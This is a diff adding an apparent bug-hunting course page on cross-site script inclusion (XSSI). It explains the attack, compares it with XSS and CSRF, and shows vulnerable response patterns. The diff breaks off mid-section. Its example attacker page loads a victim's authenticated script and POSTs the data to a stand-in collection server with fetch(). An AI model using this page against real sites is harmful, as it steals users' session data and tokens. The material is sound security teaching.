@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control: Dark Arts vault requires house membership -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSSI: Cross-Site Script Inclusion -- Bug Hunting // Dark Arts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+
+        /* Scroll progress bar at top of viewport */
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+
+        /* Sticky header */
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+
+        /* Main content container */
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+
+        /* Hero / intro block */
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+
+        /* Risk tag pills under subtitle */
+        .risk-tags { display: flex; justify-content: center; gap: 14px; margin-top: 22px; flex-wrap: wrap; }
+        .risk-tag { padding: 5px 14px; border-radius: 20px; font-size: 0.72rem; letter-spacing: 0.1em; text-transform: uppercase; font-family: 'Courier New', monospace; }
+        .risk-exploitability { background: rgba(234, 179, 8, 0.12); border: 1px solid rgba(234, 179, 8, 0.3); color: #facc15; }
+        .risk-prevalence { background: rgba(147, 51, 234, 0.15); border: 1px solid rgba(147, 51, 234, 0.3); color: #c084fc; }
+        .risk-impact { background: rgba(249, 115, 22, 0.12); border: 1px solid rgba(249, 115, 22, 0.3); color: #fb923c; }
+
+        /* Section fade-in — JS adds .visible via IntersectionObserver */
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.05rem; font-weight: 400; margin: 28px 0 14px; }
+
+        /* Comparison table */
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+
+        /* Severity badges */
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-critical { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-high { background: rgba(249, 115, 22, 0.2); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.3); }
+        .badge-medium { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-low { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-info { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+
+        /* Attack flow numbered steps */
+        .numbered-list { list-style: none; padding-left: 0; margin-bottom: 16px; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; position: relative; padding-left: 40px; margin-bottom: 14px; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 0; color: #9333ea; font-family: 'Courier New', monospace; font-size: 0.85rem; font-weight: bold; }
+
+        /* Concept cards grid */
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .concept-tag { display: inline-block; margin-top: 10px; padding: 3px 10px; background: rgba(80, 40, 100, 0.3); border-radius: 12px; font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase; }
+
+        /* Callout boxes */
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+
+        /* Monospaced code blocks — terminal style */
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre; }
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .val { color: #fbbf24; }
+        .code-block .tag { color: #60a5fa; }
+        .code-block .attr { color: #f9a8d4; }
+        .code-block .hdr { color: #34d399; }
+        .code-label { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+
+        /* Two-column layout for comparisons */
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+
+        /* Attack scenario box */
+        .scenario-box { background: rgba(8, 3, 14, 0.9); border: 1px solid rgba(147, 51, 234, 0.2); border-radius: 8px; padding: 24px; margin: 24px 0; }
+        .scenario-title { font-size: 0.7rem; letter-spacing: 0.25em; text-transform: uppercase; color: #9333ea; margin-bottom: 16px; font-family: 'Courier New', monospace; display: flex; align-items: center; gap: 8px; }
+        .scenario-step { display: flex; gap: 16px; margin-bottom: 18px; }
+        .scenario-step:last-child { margin-bottom: 0; }
+        .step-num { width: 28px; height: 28px; border-radius: 50%; background: rgba(147, 51, 234, 0.2); border: 1px solid rgba(147, 51, 234, 0.4); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; color: #a855f7; font-family: 'Courier New', monospace; flex-shrink: 0; }
+        .step-content { flex: 1; }
+        .step-label { font-size: 0.78rem; color: #c4a0d8; margin-bottom: 4px; font-weight: 400; }
+        .step-desc { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+
+        /* Vulnerable pattern cards */
+        .vuln-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 16px; margin: 20px 0; }
+        .vuln-card { background: rgba(10, 3, 16, 0.7); border: 1px solid rgba(239, 68, 68, 0.15); border-radius: 8px; padding: 20px; transition: border-color 0.3s ease; }
+        .vuln-card:hover { border-color: rgba(239, 68, 68, 0.3); }
+        .vuln-card-title { font-size: 0.88rem; color: #f87171; margin-bottom: 8px; font-family: 'Courier New', monospace; display: flex; align-items: center; gap: 8px; }
+        .vuln-card-desc { font-size: 0.82rem; color: #8a6a9a; margin-bottom: 12px; line-height: 1.6; }
+
+        /* Prevention list */
+        .prevention-list { list-style: none; padding: 0; margin: 16px 0; }
+        .prevention-item { display: flex; gap: 16px; padding: 14px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); }
+        .prevention-item:last-child { border-bottom: none; }
+        .prevention-icon { width: 32px; height: 32px; border-radius: 6px; background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.2); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .prevention-label { font-size: 0.88rem; color: #c4a0d8; margin-bottom: 4px; }
+        .prevention-desc { font-size: 0.82rem; color: #8a6a9a; line-height: 1.6; }
+
+        /* Real-world example cards */
+        .example-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-left: 3px solid #9333ea; border-radius: 0 8px 8px 0; padding: 20px 24px; margin: 16px 0; }
+        .example-company { font-size: 0.7rem; letter-spacing: 0.2em; text-transform: uppercase; color: #9333ea; margin-bottom: 8px; font-family: 'Courier New', monospace; }
+        .example-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .example-body { font-size: 0.87rem; color: #8a6a9a; line-height: 1.65; }
+
+        /* Completion section */
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .module-header { padding: 15px 20px; }
+            .module-content { padding: 20px; }
+            .two-col { grid-template-columns: 1fr; }
+            .concept-grid { grid-template-columns: 1fr; }
+            .vuln-grid { grid-template-columns: 1fr; }
+            .intro-title { font-size: 1.8rem; }
+            .section-title { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&larr; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; XSSI</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">
+            <img src="/assets/images/icons/icon-fishhook.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain">
+        </div>
+        <h1 class="intro-title">Cross-Site Script Inclusion (XSSI)</h1>
+        <div class="intro-meta">Bug Hunting &bull; Web Vulnerabilities &bull; Client-Side Data Theft</div>
+        <p class="intro-subtitle">
+            When your authenticated JavaScript becomes someone else's data source. XSSI exploits the browser's
+            same-origin relaxation for script tags to steal authenticated data from dynamic JavaScript responses
+            &mdash; a quiet attack vector that lives in the gap between CORS policy and content-type enforcement.
+        </p>
+        <div class="risk-tags">
+            <span class="risk-tag risk-exploitability">Exploitability: Moderate</span>
+            <span class="risk-tag risk-prevalence">Prevalence: Occasional</span>
+            <span class="risk-tag risk-impact">Impact: Harmful</span>
+        </div>
+        <div class="module-stats">
+            <div class="stat-pill">XSSI vs XSS vs CSRF</div>
+            <div class="stat-pill">JSONP Hijacking</div>
+            <div class="stat-pill">Constructor Override</div>
+            <div class="stat-pill">Detection &amp; Defense</div>
+            <div class="stat-pill">~20 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: What Is XSSI? -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-scroll.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            What Is XSSI?
+        </h2>
+        <div class="section-body">
+            <p>
+                Cross-Site Script Inclusion (XSSI) is a class of attacks that exploits the browser's
+                exception to the Same-Origin Policy for <code>&lt;script&gt;</code> tags. Unlike traditional
+                resource requests, browsers allow any page to load JavaScript from any origin via
+                <code>&lt;script src="..."&gt;</code> &mdash; no CORS preflight, no origin check,
+                and crucially, the cookies for the target origin are sent automatically.
+            </p>
+            <p>
+                The attack model is deceptively simple: if a victim site serves user-specific data
+                embedded inside a JavaScript response (as a variable assignment, an array literal, or a
+                JSONP callback), an attacker-controlled page can include that URL as a script tag. The
+                browser fetches the resource with the victim's session cookies attached, executes the
+                JavaScript, and the attacker's page can then read the resulting variable values.
+            </p>
+            <p>
+                This is fundamentally different from XSS. In XSS, the attacker injects code <em>into</em>
+                the victim's page and runs in the victim's origin. In XSSI, the attacker's page is the
+                host &mdash; it pulls authenticated data from the victim's server into its own context.
+                The browser is not the victim; the browser is the unwitting delivery mechanism.
+            </p>
+
+            <div class="callout callout-info">
+                <span class="callout-icon"><img src="/assets/images/icons/icon-info.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+                <div>
+                    <div class="callout-title">The Core Condition</div>
+                    <div class="callout-text">
+                        XSSI requires three conditions to be exploitable: (1) an endpoint returns
+                        authenticated, user-specific data, (2) the response is valid JavaScript that
+                        the browser will execute, and (3) the data is accessible from the global scope
+                        after execution. All three must be true simultaneously.
+                    </div>
+                </div>
+            </div>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-icon"><img src="/assets/images/icons/icon-globe.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></div>
+                    <div class="concept-card-title">The Script Tag Exception</div>
+                    <div class="concept-card-body">Browsers allow cross-origin script loads as a design decision predating SOP. A page at attacker.com can freely include scripts from victim.com &mdash; this is how CDNs work.</div>
+                    <span class="concept-tag">SOP Bypass</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon"><img src="/assets/images/icons/icon-cookie.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></div>
+                    <div class="concept-card-title">Cookie Inclusion</div>
+                    <div class="concept-card-body">When a browser fetches a script from victim.com, it includes all cookies for victim.com. If the endpoint requires authentication, the victim's session is automatically used.</div>
+                    <span class="concept-tag">Session Theft</span>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-icon"><img src="/assets/images/icons/icon-code.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></div>
+                    <div class="concept-card-title">Data as JavaScript</div>
+                    <div class="concept-card-body">The vulnerability surfaces when data responses are formatted as executable JavaScript instead of pure JSON. The attacker's page gets execution context over the data.</div>
+                    <span class="concept-tag">Data Exposure</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: How It Works -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-map.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            How It Works
+        </h2>
+        <div class="section-body">
+            <p>
+                The attack requires the victim to be logged into the target site in the same browser
+                that visits the attacker's page. When both conditions are true, the attack executes
+                transparently. Walk through this scenario step by step.
+            </p>
+
+            <div class="scenario-box">
+                <div class="scenario-title">
+                    <img src="/assets/images/icons/icon-target.webp" alt="" style="width:1em;height:1em;vertical-align:middle;display:inline-block;object-fit:contain">
+                    Attack Scenario: Authenticated API Endpoint
+                </div>
+
+                <div class="scenario-step">
+                    <div class="step-num">01</div>
+                    <div class="step-content">
+                        <div class="step-label">Victim site exposes data as JavaScript</div>
+                        <div class="step-desc">The target application serves user profile data at an authenticated endpoint. The response is JavaScript, not JSON.</div>
+                    </div>
+                </div>
+
+                <div class="scenario-step">
+                    <div class="step-num">02</div>
+                    <div class="step-content">
+                        <div class="step-label">Victim is logged in</div>
+                        <div class="step-desc">The victim has an active session cookie for corp.net stored in their browser.</div>
+                    </div>
+                </div>
+
+                <div class="scenario-step">
+                    <div class="step-num">03</div>
+                    <div class="step-content">
+                        <div class="step-label">Victim visits attacker's page</div>
+                        <div class="step-desc">Attacker sends a phishing link or embeds a malicious ad. Victim opens attacker.com in the same browser.</div>
+                    </div>
+                </div>
+
+                <div class="scenario-step">
+                    <div class="step-num">04</div>
+                    <div class="step-content">
+                        <div class="step-label">Attacker page includes the victim's API as a script</div>
+                        <div class="step-desc">The browser sees a &lt;script src&gt; pointing to corp.net, fetches it with the victim's cookies attached, and executes the response.</div>
+                    </div>
+                </div>
+
+                <div class="scenario-step">
+                    <div class="step-num">05</div>
+                    <div class="step-content">
+                        <div class="step-label">Attacker reads the data</div>
+                        <div class="step-desc">The script executed a variable assignment into the global scope. The attacker's code accesses the variable and exfiltrates the data.</div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Victim Server: The Vulnerable Endpoint</h3>
+            <p>The victim site serves this endpoint at <code>https://corp.net/api/user-data.js</code>. It requires authentication but returns JavaScript:</p>
+
+            <div class="code-label">// victim server response (Content-Type: application/javascript)</div>
+            <div class="code-block"><span class="comment">// corp.net/api/user-data.js  --  requires valid session cookie</span>
+<span class="kw">var</span> userData <span class="kw">=</span> {
+    name:   <span class="str">"Agent_X"</span>,
+    email:  <span class="str">"agent@corp.net"</span>,
+    role:   <span class="str">"admin"</span>,
+    token:  <span class="str">"eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjQ3fQ.abc"</span>,
+    mfa_backup_codes: [<span class="str">"482910"</span>, <span class="str">"773021"</span>, <span class="str">"994817"</span>]
+};</div>
+
+            <h3>Attacker's Page: The Exploit</h3>
+            <div class="code-label">// attacker.com/steal.html</div>
+            <div class="code-block"><span class="tag">&lt;!DOCTYPE html&gt;</span>
+<span class="tag">&lt;html&gt;</span>
+<span class="tag">&lt;head&gt;&lt;title&gt;</span>Free Gift Card Generator<span class="tag">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="tag">&lt;body&gt;</span>
+
+<span class="comment">&lt;!-- Step 1: Browser fetches this with victim's cookies.
+     userData variable is now set in global scope. --&gt;</span>
+<span class="tag">&lt;script</span> <span class="attr">src</span>=<span class="str">"https://corp.net/api/user-data.js"</span><span class="tag">&gt;&lt;/script&gt;</span>
+
+<span class="tag">&lt;script&gt;</span>
+<span class="comment">// Step 2: userData is now accessible — browser executed the script above.</span>
+<span class="comment">// The SOP does NOT prevent reading variables set by cross-origin scripts.</span>
+
+<span class="kw">window.onload</span> = <span class="kw">function</span>() {
+    <span class="kw">if</span> (<span class="kw">typeof</span> userData !== <span class="str">'undefined'</span>) {
+        <span class="comment">// Step 3: Exfiltrate to attacker's collection server.</span>
+        <span class="kw">fetch</span>(<span class="str">'https://attacker.com/collect'</span>, {
+            method: <span class="str">'POST'</span>,
+            body:   JSON.stringify(userData)
+        });
+    }
+};
+<span class="tag">&lt;/script&gt;</span>
+<span class="tag">&lt;/body&gt;
+&lt;/html&gt;</span></div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon"><img src="/assets/images/icons/icon-warning.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+                <div>
+                    <div class="callout-title">Why SOP Doesn't Help Here</div>
+                    <div class="callout-text">
+                        The Same-Origin Policy prevents <em>reading</em> responses to cross-origin requests
+                        made via <code>fetch()</code> or <code>XHR</code>. But script tags are different:
+                        the browser executes the response. Once executed, the variable is in the attacker
+                        page's own JavaScript scope &mdash; no cross-origin read occurs. The data is already
+                        on the attacker's side.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: XSSI vs XSS vs CSRF -->
+    <div class="section" id="s3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-table.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            XSSI vs XSS vs CSRF
+        </h2>
+        <div class="section-body">
+            <p>
+                All three attacks exploit the browser's trust model around same-origin policies, but they
+                operate on different sides of the transaction. Understanding where each attack lives in the
+                request-response lifecycle clarifies why separate defenses are required.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Attribute</th>
+                        <th>XSS</th>
+                        <th>CSRF</th>
+                        <th>XSSI</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Attacker's Page</td>
+                        <td>Not needed (code runs on victim's origin)</td>
+                        <td>Hosts the malicious request</td>
+                        <td>Hosts the malicious script inclusion</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Attack Origin</td>
+                        <td>Victim's own origin</td>
+                        <td>Cross-origin (attacker site)</td>
+                        <td>Cross-origin (attacker site)</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Goal</td>
+                        <td>Code execution in victim's browser session</td>
+                        <td>Perform state-changing actions as the victim</td>
+                        <td>Read authenticated data from victim's responses</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Exploit Vector</td>
+                        <td>Injected script into victim page's DOM</td>
+                        <td>Hidden form / img tag / fetch to victim API</td>
+                        <td>&lt;script src&gt; pointing to victim's JS endpoint</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Cookie Usage</td>
+                        <td>Has full access to victim origin cookies</td>
+                        <td>Browser sends victim cookies with request</td>
+                        <td>Browser sends victim cookies with script fetch</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Requires Login</td>
+                        <td>No (but escalates with auth)</td>
+                        <td>Yes (performs actions as victim)</td>
+                        <td>Yes (reads victim's personalized data)</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Primary Defense</td>
+                        <td>Output encoding, CSP</td>
+                        <td>CSRF tokens, SameSite cookies</td>
+                        <td>application/json Content-Type, response prefix</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Severity</td>
+                        <td><span class="badge badge-critical">Critical</span></td>
+                        <td><span class="badge badge-high">High</span></td>
+                        <td><span class="badge badge-high">High</span></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-info">
+                <span class="callout-icon"><img src="/assets/images/icons/icon-brain.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+                <div>
+                    <div class="callout-title">The Trust Triangle</div>
+                    <div class="callout-text">
+                        XSS exploits the victim's trust in their own site's content. CSRF exploits the victim
+                        site's trust in the victim's browser. XSSI exploits the browser's trust in script
+                        tags from any origin. Each attack lives at a different edge of the three-way trust
+                        relationship between user, browser, and server.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: Vulnerable Patterns -->
+    <div class="section" id="s4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon"><img src="/assets/images/icons/icon-virus.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"></span>
+            Vulnerable Patterns
+        </h2>
+        <div class="section-body">
+            <p>
+                XSSI exploitability is determined by how the server formats its response. Four common
+                patterns create the vulnerability. Each can appear independently or in combination.
+            </p>
+
+            <div class="vuln-grid">
+                <div class="vuln-card">
+                    <div class="vuln-card-title">
+                        <img src="/assets/images/icons/icon-warning.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                        JSONP Callbacks
+                    </div>
+                    <div class="vuln-card-desc">
+                        Classic and most exploitable. The endpoint wraps JSON in a named function call.
+                        The attacker defines that function before including the script.
+                    </div>
+                    <div class="code-label">// server response</div>
+                    <div class="code-block"><span class="comment">// GET /api/user?callback=myFunc</span>
+myFunc({
+    uid: <span class="val">4721</span>,
+    email: <span class="str">"victim@corp.net"</span>,
+    api_key: <span class="str">"sk-live-9f3a..."</span>
+});</div>
+                </div>
+
+                <div class="vuln-card">
+                    <div class="vuln-card-title">
+                        <img src="/assets/images/icons/icon-warning.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                        Variable Assignment
+                    </div>
+                    <div class="vuln-card-desc">
+                        Data assigned directly to a global variable. After the script loads and executes,
+                        the attacker's code reads the variable from the global scope.
+                    </div>
+                    <div class="code-label">// server response</div>
+                    <div class="code-block"><span class="kw">var</span> CONFIG = {
+    userId:  <span class="val">4721</span>,
+    role:    <span class="str">"admin"</span>,
+    csrf:    <span class="str">"f3a9c..."</span>,
+    balance: <span class="val">84250.00</span>
+};</div>
+                </div>
+
+                <div class="vuln-card">
+                    <div class="vuln-card-title">
+                        <img src="/assets/images/icons/icon-warning.webp" alt="" style="width:0.9em;height:0.9em;vertical-align:middle;display:inline-block;object-fit:contain">
+                        Bare Array/Object Literal
+                    </div>
+                    <div class="vuln-card-desc">
+                        A JSON array returned directly as a JavaScript response. Valid JS, valid exploit.
+                        The Array constructor override technique (ES5 era) intercepts it.
+                    </div>
+                    <div class="code-label">// server response (Content-Type: application/javascript)</div>
+                    <div class="code-block">[
